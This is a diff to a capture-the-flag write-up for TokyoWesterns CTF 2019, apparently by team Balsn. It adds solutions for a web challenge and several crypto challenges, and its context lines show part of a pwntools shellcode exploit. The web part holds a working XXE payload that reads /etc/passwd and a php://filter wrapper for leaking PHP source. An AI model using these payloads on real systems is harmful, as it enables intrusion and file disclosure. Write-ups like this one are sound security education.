@@ -1,6 +1,5 @@
 # TokyoWesterns CTF 5th 2019
 
-
 **It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190831-tokyowesternsctf/) of this writeup.**
 
 
@@ -47,9 +46,11 @@ r.sendlineafter(":)","A".ljust(0x100,"\x00")+p64(0x00601b00)+p64(0x4006db)+p64(0
 r.sendline(asm(shellcraft.sh()).ljust(0x108,"\x00")+p64(0x601a00))
 r.interactive()
 ```
+
 ### SecureKarte
 
 Probability...
+
 
 ```python=
 #!/usr/bin/env python
@@ -238,8 +239,8 @@ free("m")
 
 
 r.interactive()
-
 ```
+
 ### Multi Heap
 
 ```python
@@ -419,6 +420,25 @@ int main(){
 ## web
 
 ### j2x2j
+
+We could easily come out that there sould be a XXE vuln and the payload below would expose the issue.
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<catalog>
+   <core id="test101">
+      <author>John, Doe</author>
+      <title>I love XML</title>
+      <category>Computers</category>
+      <price>9.99</price>
+      <date>2018-10-01</date>
+      <description>&xxe;</description>
+   </core>
+</catalog>
+```
+
+After some basic directory brute-forcing, `flag.php` could be found as our target. However, directly reading the php file results in xml parser error, caused by some string like `<?php`. A base64 php wrapper would help to solve the problem `php://filter/read=convert.base64-encode/resource=./flag.php`
 
 ### PHP Note
 
@@ -1273,10 +1293,150 @@ print f1+f2
 ## crypto
 
 ### real-baby-rsa
+Build a dictionary of all encrypted characters then you can rebuild the flag.
+
+Script:
+
+```python
+#!/usr/bin/env python
+
+# Public Parameters
+N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091
+e = 65537
+
+ciphers = {}
+
+for c in range(256):
+    ciphers[pow(c, e, N)] = chr(c)
+
+data = open('./output').read().strip().split('\n')
+print ''.join([ciphers[int(a)] for a in data])
+```
+
+Flag: `TWCTF{padding_is_important}`
 
 ### Simple Logic
 
+the script given:
+```ruby=
+
+ROUNDS = 765
+BITS = 128
+PAIRS = 6
+
+def encrypt(msg, key)
+    enc = msg
+    mask = (1 << BITS) - 1
+    ROUNDS.times do
+        enc = (enc + key) & mask
+        enc = enc ^ key
+    end
+    enc
+end
+
+flag = SecureRandom.bytes(BITS / 8).unpack1('H*').to_i(16)
+key = SecureRandom.bytes(BITS / 8).unpack1('H*').to_i(16)
+
+STDERR.puts "The flag: TWCTF{%x}" % flag
+STDERR.puts "Key=%x" % key
+STDOUT.puts "Encrypted flag: %x" % encrypt(flag, key)
+fail unless decrypt(encrypt(flag, key), key) == flag # Decryption Check
+
+PAIRS.times do |i|
+    plain = SecureRandom.bytes(BITS / 8).unpack1('H*').to_i(16)
+    enc = encrypt(plain, key)
+    STDOUT.puts "Pair %d: plain=%x enc=%x" % [-~i, plain, enc]
+end
+# the output is redirected to para.txt
+```
+it's easy to see that we can bruteforce the key from lower bits to higher bits.
+
+solution:
+```python=
+
+from Crypto.Util.number import *
+nbits = 128
+rounds = 765
+
+def encrypt(msg, key):
+    mask = (1<<128) - 1
+    for i in range(rounds):
+        msg = (msg + key) & mask
+        msg ^= key
+    return msg
+
+def decrypt(msg, key):
+    mask = (1<<128) - 1
+    for i in range(rounds):
+        msg ^= key
+        msg = (msg - key) & mask
+    return msg
+
+with open('para.txt') as f:
+    x = f.read().strip().split('\n')
+
+plains, encs = [], []
+for i in range(6):
+    now = x[i].split(':')[1].strip().split(' ')
+    exec(now[0])
+    exec(now[1])
+    plains.append(plain)
+    encs.append(enc)
+
+print (plains)
+print (encs)
+
+nows = ['']
+for i in range(129):
+    tmp_now = []
+    for now in nows:
+        for poss in '01':
+            now_key = poss + now
+            now_key = int(now_key, 2)
+
+            # sign means this now_key is possible choice
+            sign = True
+            for pair in zip(plains, encs):
+                enc = encrypt(pair[0], now_key)
+                enc ^= pair[1]
+                mask = (1<<(i+1)) - 1
+                if enc & mask != 0:
+                    sign = False
+                    break
+
+            if sign:
+                tmp_now.append(poss+now)
+    nows = tmp_now
+
+print (nows)
+
+for now in nows:
+    now_key = int(now, 2)
+    print (now_key)
+    for i in range(6):
+        assert encrypt(plains[i], now_key) == encs[i]
+        assert decrypt(encs[i], now_key) == plains[i]
+print ('pass!')
+flag = 0x43713622de24d04b9c05395bb753d437
+for now in nows:
+    now_key = int(now, 2)
+    pt = decrypt(flag, now_key)
+    print ('flag : ', 'TWCTF{' + hex(pt)[2:].rstrip('L') + '}')
+```
+
 ### Happy!
+
+We are given `n`, `e = 65537` and `cf = p^(-1) mod q^k`. By observing the number of bits of `cf` and `n`, we can guess `k = 2`, and `n = p*q^2`. Note that `p` is a solution of `f(x) = x^2 - cf^(-1)*x`, we can recover `p` by:
+
+```python
+cf_inv = inverse_mod(cf, n)
+F.<x> = PolynomialRing(Zmod(n), implementation='NTL')
+f = (x**2) - cf_inv*x
+roots = f.small_roots()
+print(roots) # [0, p]
+```
+
+Then we calculate `q = sqrt(n/p)` and decrypt the ciphertext. Flag: `TWCTF{I_m_not_sad__I_m_happy_always}`
 
 ### M-Poly-Cipher
 The program looks like:
